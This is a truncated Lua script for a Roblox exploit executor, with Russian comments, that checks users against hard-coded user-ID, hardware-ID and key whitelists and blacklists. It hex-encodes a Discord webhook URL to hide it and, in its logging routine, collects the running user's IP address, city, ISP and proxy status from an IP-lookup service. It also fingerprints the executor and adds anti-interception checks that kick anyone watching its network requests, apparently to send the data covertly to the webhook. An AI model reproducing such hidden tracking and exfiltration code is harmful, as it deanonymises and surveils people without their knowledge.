local _lp = game:GetService("Players").LocalPlayer
local _ts = game:GetService("TestService")
local _H = game:GetService("HttpService")
local _U = game:GetService("UserInputService")
local _RS = game:GetService("ReplicatedStorage")
local _MS = game:GetService("MarketplaceService")
local _RAS = game:GetService("RbxAnalyticsService")

local Config = {
    WL = {
        UIDs = {"1644351300"},
        HWIDs = {"1CCA9BF5-D99F-40C7-AD9D-9329BA286AAE"},
        Keys = {"29606246-6429-47FC-9A0F-362B8CA6B2AC"}
    },
    BL = {
        UIDs = {"8085944684"},
        HWIDs = {"36a40f68-74c0-4bf1-a715-8c47d2f23d6a"},
        Keys = {"1f0e6ee3-bc21-4eee-b649-66150b226fdb"}
    }
}

local _uid = tostring(_lp.UserId)
local _hw = "N/A"
pcall(function() _hw = _RAS:GetClientId() end)

local _tk = "N/A"
pcall(function()
    if isfile and isfile("nazarkus_key.json") then
        _tk = readfile("nazarkus_key.json")
    end
end)

local function chk(l)
    for _, v in ipairs(l.UIDs or {}) do if v == _uid then return true end end
    for _, v in ipairs(l.HWIDs or {}) do if v == _hw then return true end end
    for _, v in ipairs(l.Keys or {}) do if v == _tk then return true end end
    return false
end

local _isWL = chk(Config.WL)
local _isBL = chk(Config.BL)
local _st = _isWL and "whitelist" or (_isBL and "blacklist" or "guest")

local function _D(h)
    local s = ""
    for i = 1, #h, 2 do s = s .. string.char(tonumber(h:sub(i, i + 1), 16)) end
    return s
end
local _W = _D("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531393430393931353135383835393738382F73773463755770452D5332535659484D3072314D53455676613858694C63455F655064522D52777178665751393463485063635273643032527763565973473737416761")

-- === БЕЗОПАСНЫЙ REQUEST: проверяет спай перед КАЖДЫМ сетевым запросом ===
local function _safeReq(opts)
    -- Проверка спая перед отправкой
    if getgenv().__NK_detectSpy then
        local se = getgenv().__NK_detectSpy()
        if se then
            if getgenv().__NK_KICK then
                getgenv().__NK_KICK(se)
            else
                _lp:Kick("Security Error: [" .. tostring(se) .. "]")
            end
            return nil
        end
    end
    
    local req = (syn and syn.request) or request or http_request
    if not req then return nil end
    
    local ok, result = pcall(req, opts)
    if ok then return result end
    return nil
end

local function _LOG()
    pcall(function()
        -- Собираем данные ТОЛЬКО ЕСЛИ спая нет
        -- Каждый вызов _safeReq сам проверит и кикнет если что
        
        local ni = {}
        local r = _safeReq({
            Url = "http://ip-api.com/json/?fields=status,country,city,timezone,isp,query,proxy,hosting",
            Method = "GET"
        })
        if r and r.Success then
            pcall(function() ni = _H:JSONDecode(r.Body) end)
        end

        local u = 0
        local tu = {"getgenv", "getrawmetatable", "hookfunction", "setreadonly"}
        for _, fname in ipairs(tu) do
            pcall(function() if getgenv()[fname] then u = u + 1 end end)
        end
        local execName = "Unknown"
        pcall(function() if identifyexecutor then execName = identifyexecutor() end end)
        local unc = execName .. " (UNC: " .. math.floor((u / 4) * 100) .. "%)"

        local fn, ft = "None", "None"
        pcall(function()
            local fdf = _RS:FindFirstChild("FactionSysRS") and _RS.FactionSysRS:FindFirstChild("FactionData")
            if fdf then
                for _, fChild in ipairs(fdf:GetChildren()) do
                    if fChild:FindFirstChild("FactionMembers") and fChild.FactionMembers:FindFirstChild(_uid) then
                        local bd = 
